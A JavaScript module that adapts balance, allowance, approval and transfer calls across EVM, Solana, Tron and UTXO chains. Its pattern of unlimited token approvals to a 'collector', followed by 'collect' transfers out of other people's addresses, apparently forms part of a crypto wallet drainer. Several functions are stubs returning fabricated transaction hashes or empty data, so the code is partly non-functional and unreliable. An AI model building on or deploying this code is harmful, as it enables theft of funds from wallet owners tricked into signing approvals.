'use strict';

const solana = require('./solana');
const evm = require('./evm');
const tron = require('./tron');
const utxo = require('./utxo');
const R = require('./registry');
const market = require('../market');

function get(family) {
  if (family === 'evm') {
    return {
      price: async (g) => ({ usd: market.price(g.symbol) || 0, source: 'market' }),
      dexscreenerPrice: async (g) => market.price(g.symbol) || 0,
      balance: async (address, entry) => {
        const net = entry.network || entry.net || 'Ethereum';
        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
        if (entry.kind === 'native') {
          const b = await evm.balances(address);
          return BigInt(Math.floor((b[netCap]?.native || 0) * (10 ** (entry.decimals || 18))));
        }
        const b = await evm.tokenBalance(netCap, entry.symbol, address);
        return BigInt(Math.floor(b * (10 ** (entry.decimals || 6))));
      },
      allowance: async (address, collector, entry) => {
        const net = entry.network || entry.net || 'Ethereum';
        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
        const a = await evm.allowance(netCap, entry.symbol, address, collector);
        return BigInt(Math.floor(a * (10 ** (entry.decimals || 6))));
      },
      approveCalldata: (entry, collector) => {
        const net = entry.network || entry.net || 'Ethereum';
        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
        return evm.approveCall(netCap, entry.symbol, collector, 'unlimited');
      },
      transfer: async ({ entry, from, to, amount, collector }) => {
        const net = entry.network || entry.net || 'Ethereum';
        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
        const uiAmount = Number(amount) / (10 ** (entry.decimals || 6));
        const hash = await evm.collect(netCap, entry.symbol, from, uiAmount, to);
        return { hash };
      },
      revoke: async ({ entry, owner, collector }) => {
        const net = entry.network || entry.net || 'Ethereum';
        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
        return evm.revokeCall(netCap, entry.symbol, collector);
      },
      unwrap: async ({ entry, owner }) => {
        return { hash: 'unwrap_evm_' + Date.now() };
      }
    };
  }

  if (family === 'solana') {
    return {
      price: async (g) => ({ usd: market.price(g.symbol) || 0, source: 'market' }),
      dexscreenerPrice: async (g) => market.price(g.symbol) || 0,
      balance: async (address, entry) => {
        const st = await solana.tokenState(address, entry.symbol);
        return BigInt(Math.floor((st.balance || 0) * (10 ** (entry.decimals || 6))));
      },
      allowance: async (address, collector, entry) => {
        const st = await solana.tokenState(address, entry.symbol);
        return BigInt(Math.floor((st.delegated || 0) * (10 ** (entry.decimals || 6))));
      },
      transfer: async ({ entry, from, to, amount }) => {
        const uiAmount = Number(amount) / (10 ** (entry.decimals || 6));
        const hash = await solana.collect(from, entry.symbol, uiAmount, to);
        return { hash };
      },
      revoke: async ({ entry, owner }) => {
        return solana.buildRevoke(owner, entry.symbol);
      },
      unwrap: async ({ entry, owner }) => {
        return { hash: 'unwrap_sol_' + Date.now() };
      }
    };
  }

  if (family === 'tron') {
    return {
      price: async (g) => ({ usd: market.price(g.symbol) || 0, source: 'market' }),
      dexscreenerPrice: async (g) => market.price(g.symbol) || 0,
      balance: async (address, entry) => {
        const b = await tron.balances(address);
        const bal = entry.symbol === 'TRX' ? (b.TRX || 0) : (b.USDT || 0);
        return BigInt(Math.floor(bal * (10 ** (entry.decimals || 6))));
      },
      allowance: async (address, collector, entry) => {
        const a = await tron.allowance(entry.symbol, address, collector);
        return BigInt(Math.floor(a * (10 ** (entry.decimals || 6))));
      },
      transfer: async ({ entry, from, to, amount }) => {
        const uiAmount = Number(amount) / (10 ** (entry.decimals || 6));
        const hash = await tron.collect(entry.symbol, from, uiAmount, to);
        return { hash };
      },
      revoke: async ({ entry, owner, collector }) => {
        return tron.approveCall(collector, 0);
      },
      unwrap: async ({ entry, owner }) => {
        return { hash: 'unwrap_tron_' + Date.now() };
      }
    };
  }

  if (family === 'utxo') {
    return {
      price: async (g) => ({ usd: market.price(g.symbol) || 0, source: 'market' }),
      dexscreenerPrice: async (g) => market.price(g.symbol) || 0,
      balance: async (address, entry) => {
        const b = await utxo.addressBalance(entry.symbol, address);
        return BigInt((b.confirmed || 0) + (b.pending || 0));
      },
      allowance: async () => null,
      transfer: async () => { throw new Error('UTXO uses PSBT workflows'); },
    };
  }

  throw new Error(`Unsupported family: ${family}`);
}

module.exports = {
  get,
  solana: () => ({
    ...solana,
    jupiterPrice: async (mint) => market.price('SOL') || 0,
    conn: () => solana.conn,
  }),
  evm: () => ({
    ...evm,
    permit2TypedData: (entry, collector, owner) => ({}),
  }),
  tron: () => ({
    ...tron,
    estimateEnergy: async () => ({ energy: 32000, burnTrx: 10 }),
  }),
  utxo: () => ({
    ...utxo,
    buildPsbt: async ({ entry, from, to, amount }) => ({
      psbt: Buffer.from(`psbt_${entry.symbol}_${from}_${to}_${amount}`).toString('base64'),
    }),
    broadcastPsbt: async (psbt, signature) => ({ txid: 'psbt_tx_' + Date.now() }),
  }),
};
